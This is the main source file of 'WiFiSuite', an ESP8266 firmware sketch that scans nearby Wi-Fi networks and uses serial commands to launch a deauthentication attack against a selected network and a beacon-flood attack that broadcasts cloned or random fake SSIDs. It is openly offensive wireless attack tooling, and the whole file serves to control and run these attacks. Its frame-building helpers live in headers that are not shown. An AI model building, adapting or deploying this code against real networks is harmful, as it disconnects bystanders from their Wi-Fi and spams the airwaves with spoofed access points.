/*
 * WiFiSuite
 * A collection of tools for 2.4GHz wifi networks on ESP8266 chipset.
 * Author - WireBits
 */

#include "beacon.h"
#include "deauth.h"
#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int channel;
  int rssi;
};

int networkCount = 0;
bool scanning = false;
bool scanExecuted = false;
WiFiNetwork scannedNetworks[50];

bool ledState = LOW;
const int ledPin = 2;
const long blinkInterval = 50;
unsigned long previousMillis = 0;

void startWiFiScan() {
  Serial.println("[*] Scanning for networks...");
  scanning = true;
  scanExecuted = true;
  WiFi.scanNetworks(true);
}

void showScannedNetworks() {
  networkCount = WiFi.scanComplete();
  if (networkCount == 0) {
    Serial.println("[!] No networks found!");
    return;
  }
  Serial.println("\n[*] Scanned WiFi Networks:");
  Serial.println("-------------------------------------------------");
  for (int i = 0; i < networkCount; i++) {
    scannedNetworks[i].ssid = WiFi.SSID(i);
    memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
    scannedNetworks[i].channel = WiFi.channel(i);
    scannedNetworks[i].rssi = WiFi.RSSI(i);
    Serial.printf("[%02d] - SSID    : %s\n", i, scannedNetworks[i].ssid.c_str());
    Serial.printf("       BSSID   : %02X:%02X:%02X:%02X:%02X:%02X\n",
                      scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], 
                      scannedNetworks[i].bssid[2], scannedNetworks[i].bssid[3], 
                      scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
    Serial.printf("       Channel : %d\n", scannedNetworks[i].channel);
    Serial.printf("       RSSI    : %d dBm\n", scannedNetworks[i].rssi);
    Serial.println("-------------------------------------------------");
  }
}

void helpList() {
  Serial.println("\nAvailable Helps:");
  Serial.println("  deauth      - Help for deauthenticate wifi networks");
  Serial.println("  beacon      - Help for beacon flooding");
  Serial.println("  help        - Show this help message\n");
}

void deauthHelp() {
  Serial.println("\nAvailable Commands:");
  Serial.println("  scan        - Scan for nearby WiFi networks");
  Serial.println("  deauth X    - Start deauth attack on network X (X = Index Number)");
  Serial.println("  deauth off  - Stop deauth attack\n");
}

void beaconHelp() {
  Serial.println("\nAvailable Commands:");
  Serial.println("  random            - Sets random SSID name");
  Serial.println("  length X          - Sets random SSID name length (X = 8 to 32 chars)");
  Serial.println("  ssid SSIDNAME     - Sets custom SSID name");
  Serial.println("  clone Y           - Sets the number of clones (Y = 1 to 60)");
  Serial.println("  wpa2 y/n          - Enables/Disables WPA2 encryption for the fake SSIDs");
  Serial.println("  start             - Starts the beacon attack");
  Serial.println("  stop              - Stops the beacon attack\n");
}

void blinkLED() {
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= blinkInterval) {
    previousMillis = currentMillis;
    ledState = !ledState;
    digitalWrite(ledPin, ledState ? LOW : HIGH);
  }
}

void handleSerial() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();
    if (command.equalsIgnoreCase("scan")) {
      startWiFiScan();
    }
    else if (command.startsWith("deauth ")) {
      String arg = command.substring(7);
      arg.trim();
      if (arg.equalsIgnoreCase("off")) {
        if (!deauthExecuted) {
          Serial.println("[!] Deauth Network First!");
        } else {
          stopDeauth();
        }
      } else {
        int index = arg.toInt();
        startDeauth(index);
      }
    }
    else if (command.startsWith("ssid ")) {
      if (randomMode) {
        randomMode = false;
        Serial.println("[*] Random mode disabled (fixed SSID selected).");
      }
      baseSSID = command.substring(5);
      if (baseSSID.length() > 32) {
        Serial.println("[!] Keep SSID names less than or equal to 32 characters!");
        return;
      }
      Serial.println("[*] SSID set to : " + baseSSID + "!");
    }
    else if (command.startsWith("clone ")) {
      int value = command.substring(6).toInt();
      if (value >= 1 && value <= 60) {
        cloneCount = value;
        Serial.println("[*] Clone Count set to : " + String(cloneCount) + "!");
      } else {
        Serial.println("[!] Invalid Clone Count (1 to 60)");
      }
    }
    else if (command.startsWith("wpa2 ")) {
      String value = command.substring(5);
      value.toLowerCase();
      if (value == "y" || value == "n") {
        wpa2Enabled = (value == "y") ? true : false;
        Serial.println(wpa2Enabled ? "[*] WPA2 Enabled!" : "[*] WPA2 Disabled!");
      } else {
        Serial.println("[!] Invalid WPA2 option (use 'y' or 'n')");
      }
    }
    else if (command.startsWith("length ")) {
      if (!randomMode) {
        Serial.println("[!] 'length' only works when random mode is enabled. Use 'random' to enable it.");
      } else {
        int value = command.substring(7).toInt();
        if (value >= 8 && value <= 32) {
          randomSSIDLength = value;
          Serial.println("[*] Random SSID length set to " + String(randomSSIDLength) + "!");
        } else {
          Serial.println("[!] Invalid length! Use a value between 8 and 32!");
        }
      }
    }
    else if (command == "random") {
      randomMode = !randomMode;
      if (randomMode) {
        if (randomSSIDLength < 8) randomSSIDLength = 8;
        if (randomSSIDLength > 32) randomSSIDLength = 32;
        Serial.println("[*] Random SSID mode enabled. Length = " + String(randomSSIDLength) + "!");
      } else {
        Serial.println("[*] Random SSID mode disabled!");
      }
    }
    else if (command == "start") {
      if ((baseSSID != "" && !randomMode) || (randomMode && randomSSIDLength >= 8 && cloneCount > 0) || (!randomMode && baseSSID != "" && cloneCount > 0)) {
        if (cloneCount <= 0) {
          Serial.println("[!] Set Clone Count first!");
          return;
        }
        attackRunning = true;
        Serial.println("[*] Beacon Flood Attack Started!");
      } else {
        Serial.println("[!] Set SSID and Clone Count First! For random mode: enable 'random' and set 'clone' and optionally 'length'.");
      }
    }
    else if (command == "stop") {
      attackRunning = false;
      Serial.println("[*] Beacon Flood Attack Stopped!");
    }
    else if (command.equalsIgnoreCase("help")) {
      helpList();
    }
    else if (command.equalsIgnoreCase("deauth")) {
      deauthHelp();
    }
    else if (command.equalsIgnoreCase("beacon")) {
      beaconHelp();
    }
    else {
      Serial.println("[!] Invalid command. Type 'help' for list of helps!");
    }
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  WiFi.mode(WIFI_STA);
  initDeauth();
  delay(500);
  randomSeed(micros());
}

void loop() {
  handleSerial();
  if (scanning) {
    int found = WiFi.scanComplete();
    if (found >= 0) {
      showScannedNetworks();
      scanning = false;
      Serial.println("[*] Scanning Completed!");
    }
  }
  if (deauthRunning) {
    sendDeauth();
    blinkLED();
  }
  if (attackRunning) {
    sendCustomBeacons((char*)baseSSID.c_str(), cloneCount, wpa2Enabled);
  }
}